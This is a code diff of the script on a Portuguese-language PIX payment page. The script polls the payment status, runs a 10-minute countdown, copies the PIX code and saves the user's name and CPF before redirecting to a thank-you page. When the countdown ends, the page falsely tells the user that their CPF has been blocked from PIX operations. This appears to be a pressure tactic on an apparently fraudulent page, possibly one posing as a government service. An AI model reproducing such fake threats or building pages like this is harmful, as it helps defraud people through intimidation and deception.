@@ -277,102 +277,105 @@
     </footer>
 
     <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        let transactionId = '{{ transaction_id }}';
-        let checkInterval;
+        document.addEventListener('DOMContentLoaded', function() {
+            let transactionId = '{{ transaction_id }}';
+            let checkInterval;
 
-        // Timer functionality
-        let timeLeft = 10 * 60; // 10 minutes in seconds
-        const timerDisplay = document.getElementById('timer');
+            // Timer functionality
+            let timeLeft = 10 * 60; // 10 minutes in seconds
+            const timerDisplay = document.getElementById('timer');
 
-        const countdown = setInterval(() => {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            const countdown = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
 
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                clearInterval(checkInterval);
-                timerDisplay.textContent = "00:00";
-                alert("Tempo expirado! Seu CPF foi bloqueado para operações PIX.");
-                window.location.href = '/';
-            }
-            timeLeft--;
-        }, 1000);
-
-        function checkPaymentStatus() {
-            console.log('Verificando status do pagamento:', transactionId);
-            fetch(`/check-payment-status/${transactionId}`)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('Resposta do status do pagamento:', data);
-                    console.log('Status original:', data.original_status);
-
-                    // Verifica exatamente o status "APPROVED"
-                    if (data.original_status === 'APPROVED') {
-                        console.log('Pagamento APROVADO! Redirecionando...');
-
-                        // Armazena dados do usuário
-                        const userData = {
-                            nome: '{{ nome }}',
-                            cpf: '{{ cpf }}'
-                        };
-                        localStorage.setItem('userData', JSON.stringify(userData));
-
-                        // Para imediatamente as verificações
-                        clearInterval(checkInterval);
-                        clearInterval(countdown);
-
-                        // Redireciona instantaneamente
-                        window.location.replace('/obrigado');
-                        return;
-                    }
-                    console.log('Pagamento ainda pendente');
-                })
-                .catch(error => {
-                    console.error('Erro ao verificar status:', error);
-                });
-        }
-
-        // Verifica o status a cada 1 segundo
-        checkInterval = setInterval(checkPaymentStatus, 1000);
-
-        // Verificação inicial
-        checkPaymentStatus();
-
-        // Mostra o conteúdo e esconde a tela de carregamento
-        setTimeout(() => {
-            document.getElementById('loadingScreen').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
-        }, 1500);
-
-        // Funcionalidade de copiar código PIX
-        window.copyPixCode = function() {
-            const pixCode = document.getElementById('pixCode').textContent.trim();
-            const copyButton = document.querySelector('.copy-button');
-
-            navigator.clipboard.writeText(pixCode).then(
-                function() {
-                    copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
-                    copyButton.style.backgroundColor = '#28a745';
-                    setTimeout(() => {
-                        copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
-                        copyButton.style.backgroundColor = '#0c326f';
-                    }, 2000);
-                },
-                function(err) {
-                    console.error('Erro ao copiar:', err);
-                    copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
-                    copyButton.style.backgroundColor = '#dc3545';
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    clearInterval(checkInterval);
+                    timerDisplay.textContent = "00:00";
+                    alert("Tempo expirado! Seu CPF foi bloqueado para operações PIX.");
+                    window.location.href = '/';
                 }
-            );
-        }
-    });
+                timeLeft--;
+            }, 1000);
+
+            function redirectToThankYou() {
+                // Store user data
+                const userData = {
+                    nome: '{{ nome }}',
+                    cpf: '{{ cpf }}'
+                };
+                localStorage.setItem('userData', JSON.stringify(userData));
+
+                // Clear all intervals
+                clearInterval(checkInterval);
+                clearInterval(countdown);
+
+                // Redirect immediately
+                window.location.replace('/obrigado');
+            }
+
+            function checkPaymentStatus() {
+                console.log('Verificando status do pagamento:', transactionId);
+                fetch(`/check-payment-status/${transactionId}`)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('Resposta do status do pagamento:', data);
+                        console.log('Status original:', data.status);
+
+                        // Check for exact "APPROVED" status
+                        if (data.status === 'APPROVED') {
+                            console.log('Pagamento APROVADO! Redirecionando...');
+                            redirectToThankYou();
+                        } else {
+                            console.log('Pagamento ainda pendente');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Erro ao verificar status:', error);
+                    });
+            }
+
+            // Check status every 1 second
+            checkInterval = setInterval(checkPaymentStatus, 1000);
+
+            // Initial check
+            checkPaymentStatus();
+
+            // Show content and hide loading screen
+            setTimeout(() => {
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+            }, 1500);
+
+            // Copy PIX code functionality
+            window.copyPixCode = function() {
+                const pixCode = document.getElementById('pixCode').textContent.trim();
+                const copyButton = document.querySelector('.copy-button');
+
+                navigator.clipboard.writeText(pixCode).then(
+                    function() {
+                        copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                        copyButton.style.backgroundColor = '#28a745';
+                        setTimeout(() => {
+                            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+                            copyButton.style.backgroundColor = '#0c326f';
+                        }, 2000);
+                    },
+                    function(err) {
+                        console.error('Erro ao copiar:', err);
+                        copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
+                        copyButton.style.backgroundColor = '#dc3545';
+                    }
+                );
+            }
+        });
     </script>
 </body>
 </html>
